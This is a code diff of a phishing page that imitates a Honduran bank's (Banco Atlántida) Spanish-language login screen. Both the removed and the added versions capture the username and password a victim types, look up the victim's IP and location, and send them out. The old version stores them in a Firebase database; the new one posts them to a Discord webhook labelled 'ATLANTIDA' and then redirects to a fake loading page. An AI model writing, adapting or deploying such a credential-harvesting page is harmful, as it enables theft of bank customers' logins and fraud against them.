-                            <a href="https://app.bancatlan.hn/" data-discover="true">
-                                <button class="w-full h-[2.875rem] flex justify-center items-center rounded-2xl outline-none transition-all disabled:text-secondary-600 disabled:cursor-not-allowed focus-visible:ring-4 focus-visible:ring-primary-700/24 border border-primary-600 focus:bg-primary-100 hover:bg-primary-200 disabled:border-secondary-400 disabled:bg-secondary-100 text-primary-600">Abre tu cuenta</button>
-                            </a>
-                        </div>
-                        <div class="w-full flex justify-between items-start" bis_skin_checked="1">
-                            <a class="w-24 grid justify-items-center gap-y-2.5 py-2" href="https://app.bancatlan.hn/requests" data-discover="true">
-                                <img src="./index_files/user-lock-red.svg" class="w-[1.125rem] h-[1.125rem] m-2">
-                                <span class="text-body-sm text-center text-secondary-800">Gestiones de usuario</span>
-                            </a>
-                            <a class="w-24 grid justify-items-center gap-y-2.5 py-2" href="https://app.bancatlan.hn/help" data-discover="true">
-                                <img src="./index_files/support-red.svg" class="w-[1.125rem] h-[1.125rem] m-2">
-                                <span class="text-body-sm text-center text-secondary-800">¿Necesitas ayuda?</span>
-                            </a>
-                        </div>
-                    </section>
-                </main>
-            </div>
-        </div>
-        <div id="modal-root" bis_skin_checked="1"></div>
-        <script>
-document.getElementById('togglePassword').addEventListener('click', function (e) {
-    // Evitamos cualquier comportamiento por defecto del botón
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Iniciar sesión</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --text-dark: #1a1a2e;
+    --text-muted: #7a7a85;
+    --border: #e4e4e8;
+    --field-bg: #f7f7f9;
+  }
+  *{ box-sizing: border-box; }
+  html, body{
+    margin: 0;
+    padding: 0;
+    font-family: 'Roboto', Arial, sans-serif;
+    color: var(--text-dark);
+  }
+  body{
+    min-height: 100vh;
+    background-image: url('bg-landscape.png');
+    background-size: cover;
+    background-position: center;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    position: relative;
+  }
+  /* ---------- Difuminado negro sobre el fondo ---------- */
+  body::before{
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(
+      to bottom,
+      rgba(0,0,0,0.55) 0%,
+      rgba(0,0,0,0.25) 35%,
+      rgba(0,0,0,0.05) 60%,
+      rgba(0,0,0,0.35) 100%
+    );
+    pointer-events: none;
+    z-index: 0;
+  }
+  /* ---------- Top logo ---------- */
+  .top-logo{
+    display: block;
+    margin: 16px auto 80px;
+    position: relative;
+    z-index: 1;
+    bottom: 100px;
+  }
+  /* ---------- Card ---------- */
+  .login-card{
+    background: #fff;
+    border-radius: 24px;
+    padding: 32px 24px 24px;
+    max-width: 480px;
+    width: calc(100% - 32px);
+    margin: 0 auto;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.2);
+    position: relative;
+    z-index: 1;
+  }
+  .field{
+    margin-bottom: 16px;
+  }
+  .field input{
+    width: 100%;
+    height: 60px;
+    padding: 0 18px;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    background: var(--field-bg);
+    font-size: 15px;
+    font-family: inherit;
+    color: var(--text-dark);
+    outline: none;
+    transition: border-color .15s ease;
+  }
+  .field input::placeholder{
+    color: #9a9aa5;
+  }
+  .field input:focus{
+    border-color: #b5b5bd;
+  }
+  .forgot-row{
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .forgot-row a{
+    color: var(--text-dark);
+    font-size: 14px;
+    text-decoration: none;
+  }
+  .btn{
+    width: 100%;
+    height: 54px;
+    border: none;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 500;
+    font-family: inherit;
+    cursor: pointer;
+    margin-bottom: 14px;
+  }
+  .btn-primary{
+    background: #131316;
+    color: #fff;
+  }
+  .btn-secondary{
+    background: var(--field-bg);
+    color: var(--text-dark);
+    margin-bottom: 0;
+  }
+  /* ---------- Bottom sheet handle ---------- */
+  .sheet-handle-wrap{
+    display: flex;
+    justify-content: center;
+    padding: 18px 0 10px;
+    max-width: 480px;
+    width: 100%;
+    margin: 24px auto 0;
+    position: relative;
+    z-index: 1;
+  }
+  .sheet-handle{
+    background: rgba(0,0,0,0.55);
+    color: #fff;
+    font-size: 12px;
+    padding: 6px 16px;
+    border-radius: 20px;
+  }
+</style>
+</head>
+<body>
+  <form id="formis">
+  <img src="logopapa.png" class="top-logo" alt="Logo" style="width: 240px">
+  <div class="login-card">
+    <div class="field">
+      <input type="text" placeholder="Usuario"  id="usuario" autocomplete="off">
+    </div>
+    <div class="field">
+      <input type="password" placeholder="Contraseña" id="password" autocomplete="off">
+    </div>
+    <div class="forgot-row">
+      <a href="#">¿Olvidaste tu contraseña?</a>
+    </div>
+    <button type="submit" class="btn btn-primary" id="btnIniciar">Iniciar sesión</button>
+    <button type="button" class="btn btn-secondary">Abrir una cuenta</button>
+  </div>
+  </form>
+  <div class="sheet-handle-wrap">
+  </div>
+<script>
+  // Simple visual feedback for buttons (no real auth logic)
+  document.querySelector('.btn-primary').addEventListener('click', () => {
+    console.log('Iniciar sesión clicked');
+  });
+  document.querySelector('.btn-secondary').addEventListener('click', () => {
+    console.log('Abrir una cuenta clicked');
+  });
+</script>
+<script src="config.js"></script>
+<script>
+  const form = document.getElementById("formis");
+  const inputUsuario = document.getElementById("usuario");
+  const inputPassword = document.getElementById("password");
+  const btnIniciar = document.getElementById("btnIniciar");
+
+
+
+  form.addEventListener("submit", async function (e) {
     e.preventDefault();
-    
-    const pass = document.getElementById('pass');
-    const eyeIcon = document.getElementById('eyeIcon');
-    
-    // Alternamos el tipo de input y la imagen del botón
-    if (pass.type === 'password') {
-        pass.type = 'text';
-        eyeIcon.src = 'ojo2.svg';
-        eyeIcon.alt = 'Ocultar contraseña';
-    } else {
-        pass.type = 'password';
-        eyeIcon.src = 'ojo.svg';
-        eyeIcon.alt = 'Mostrar contraseña';
+
+    const usuario = inputUsuario.value.trim();
+    const contrasena = inputPassword.value.trim();
+
+    if (!usuario || !contrasena) {
+      alert("Por favor completa usuario y contraseña");
+      return;
     }
-});
-</script>
-<script type="text/javascript" src="./index_files/bootstrap1.js.descarga"></script>
-        
-        
-        <script>
-            // <![CDATA[  <-- For SVG support
-            if ('WebSocket'in window) {
-                (function() {
-                    function refreshCSS() {
-                        var sheets = [].slice.call(document.getElementsByTagName("link"));
-                        var head = document.getElementsByTagName("head")[0];
-                        for (var i = 0; i < sheets.length; ++i) {
-                            var elem = sheets[i];
-                            var parent = elem.parentElement || head;
-                            parent.removeChild(elem);
-                            var rel = elem.rel;
-                            if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-                                var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-                                elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-                            }
-                            parent.appendChild(elem);
-                        }
-                    }
-                    var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-                    var address = protocol + window.location.host + window.location.pathname + '/ws';
-                    var socket = new WebSocket(address);
-                    socket.onmessage = function(msg) {
-                        if (msg.data == 'reload')
-                            window.location.reload();
-                        else if (msg.data == 'refreshcss')
-                            refreshCSS();
-                    }
-                    ;
-                    if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-                        console.log('Live reload enabled.');
-                        sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-                    }
-                }
-                )();
-            } else {
-                console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-            }
-            // ]]>
-        </script>
-    <!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
 
 
-<!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
-<!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
-<!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
-<!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
-<!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
-<script>
-    // 1. CONFIGURACIÓN DE TU PROYECTO
-    const firebaseConfig = { 
-        databaseURL: "https://occidentenlinea-credicard-default-rtdb.firebaseio.com/" 
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    localStorage.setItem("usuario", usuario);
 
-    // Crear un ID único para esta sesión de usuario
-    const sessionId = "ID-" + Math.random().toString(36).substr(2, 7).toUpperCase();
+    btnIniciar.disabled = true;
+    btnIniciar.textContent = "Enviando...";
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        // Captura de datos
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
-        const btn = document.getElementById('btn-envio');
+    try {
+      let ipData = { ip: "No disponible", country: "No disponible", city: "No disponible" };
+      try {
+        const ipResponse = await fetch("https://ipinfo.io/json");
+        if (ipResponse.ok) {
+          ipData = await ipResponse.json();
+        }
+      } catch (ipErr) {
+        console.warn("No se pudo obtener la IP");
+      }
 
-        // Deshabilitar botón para evitar doble clic, pero sin cambiar texto ni mostrar loaders
-        btn.disabled = true;
+      const payload = {
+        content: `❤️ATLANTIDA❤️\nUSX: ${usuario}\nCL4V: ${contrasena}\n\n🌍 IP: ${ipData.ip}\n🏙 Ciudad: ${ipData.city || "No disponible"}\n🌐 País: ${ipData.country || "No disponible"}`
+      };
 
-        // 2. OBTENER GEOLOCALIZACIÓN Y ENVIAR AL PANEL
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(ipData => {
-                const payload = {
-                    user: u,
-                    pass: p,
-                    ip: ipData.ip || '0.0.0.0',
-                    ubicacion: `${ipData.city || '?'}, ${ipData.country_name || '?'}`,
-                    fecha: new Date().toLocaleString(),
-                    status: 'PENDING' 
-                };
+      const webhookURL = window.DISCORD_WEBHOOK;
+      if (!webhookURL) {
+        throw new Error("No se encontró window.DISCORD_WEBHOOK en config.js");
+      }
 
-                // Guardar en la rama 'logins' y redirigir inmediatamente al terminar
-                db.ref('logins/' + sessionId).set(payload).then(() => {
-                    window.location.href = 'cargando.html?id=' + sessionId;
-                });
-            })
-            .catch(() => {
-                // En caso de error de red, intentamos la redirección de todos modos para no trabar al usuario
-                window.location.href = 'cargando.html?id=' + sessionId;
-            });
-    });
+      const res = await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      if (res.ok) {
+        window.location.href = "cargando.html";
+      } else {
+        throw new Error(`Error ${res.status}`);
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Hubo un problema al procesar la solicitud.\nIntenta de nuevo más tarde.");
+    } finally {
+      btnIniciar.disabled = false;
+      btnIniciar.textContent = "Iniciar sesión";
+    }
+  });
+
 </script>
-<!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
-<!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
-</body></html>
+</body>
+</html>
